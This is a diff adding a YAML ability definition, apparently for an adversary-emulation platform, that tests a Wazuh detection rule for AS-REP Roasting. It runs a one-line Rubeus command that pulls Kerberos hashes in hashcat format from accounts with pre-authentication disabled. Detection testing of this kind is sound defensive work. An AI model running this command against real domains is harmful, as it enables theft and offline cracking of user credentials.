@@ -1,0 +1,17 @@
+- requirements: []
+  name: '[CORP] [Wazuh] [110004] AS-REP Roasting utilizando Rubeus'
+  description: "Tenta obter hashes AS-REP de usu\xE1rios com pre-auth desabilitada\
+    \ via Rubeus."
+  tactic: credential-access
+  technique_id: T1558.004
+  technique_name: 'Steal or Forge Kerberos Tickets: AS-REP Roasting'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - Rubeus.exe
+    parsers: []
+    command: .\Rubeus.exe asreproast /format:hashcat /aes
+  id: e88f4548-aa30-4371-8fc6-e93c8705904c
